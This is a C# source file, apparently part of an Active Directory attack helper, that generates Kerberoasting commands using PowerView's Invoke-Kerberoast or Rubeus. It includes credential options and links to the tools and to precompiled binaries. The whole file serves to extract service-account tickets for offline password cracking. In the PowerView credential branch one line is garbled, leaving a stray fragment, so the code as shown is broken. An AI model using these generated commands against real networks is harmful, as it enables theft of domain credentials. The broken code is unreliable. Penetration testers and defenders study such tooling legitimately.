using System.Collections.Generic;

namespace AD_Commander.Generators;

// Builds a Kerberoasting command, either via PowerView (Invoke-Kerberoast) or Rubeus.
// Pure text generation only.
public static class KerberoastGenerator
{
    public static string Generate(
        string tool,
        string targetUser,
        string outputFormat,
        bool verbose,
        string domain,
        string username,
        string password)
    {
        return tool == "Rubeus"
            ? GenerateRubeus(targetUser, outputFormat, domain, username, password)
            : GeneratePowerView(targetUser, outputFormat, verbose, domain, username);
    }

    private static string GeneratePowerView(
        string targetUser, string outputFormat, bool verbose, string domain, string username)
    {
        bool useCredential = domain.Length > 0 && username.Length > 0;
        List<string> lines = new List<string>();

        lines.Add("# PowerView (PowerSploit): https://github.com/PowerShellMafia/PowerSploit");
        lines.Add("");

        if (useCredential)
        {
            lines.Add("$SecPassword = Read-Host \"Credential password\" -AsSecureString");
   $SecPassword)");
            lines.Add("");
        }

        lines.Add("Import-Module .\\PowerView.ps1");
        lines.Add("");

        string command = $"Invoke-Kerberoast -OutputFormat {outputFormat}";
        if (targetUser.Length > 0)
        {
            command += $" -Identity '{Ps(targetUser)}'";
        }
        if (useCredential)
        {
            command += " -Credential $Cred";
        }
        if (verbose)
        {
            command += " -Verbose";
        }

        lines.Add(command);

        return string.Join("\r\n", lines);
    }

    private static string GenerateRubeus(
        string targetUser, string outputFormat, string domain, string username, string password)
    {
        bool useCredential = domain.Length > 0 && username.Length > 0 && password.Length > 0;
        List<string> lines = new List<string>();

        lines.Add("# Rubeus: https://github.com/GhostPack/Rubeus");
        lines.Add("# Precompiled binaries: https://github.com/r3motecontrol/Ghostpack-CompiledBinaries");
        if (useCredential)
        {
            lines.Add("# NOTE: Rubeus has no secure prompt; /creds below holds the password in clear text.");
        }
        lines.Add("");

        string command = $"Rubeus.exe kerberoast /format:{outputFormat.ToLowerInvariant()} /outfile:kerberoast.txt /nowrap";
        if (targetUser.Length > 0)
        {
            command += $" /user:{targetUser}";
        }
        if (useCredential)
        {
            command += $" /creds:{domain}\\{username}:{password}";
        }

        lines.Add(command);

        return string.Join("\r\n", lines);
    }

    // Escape single quotes so a value can't break out of a PowerShell single-quoted string.
    private static string Ps(string value) => value.Replace("'", "''");
}
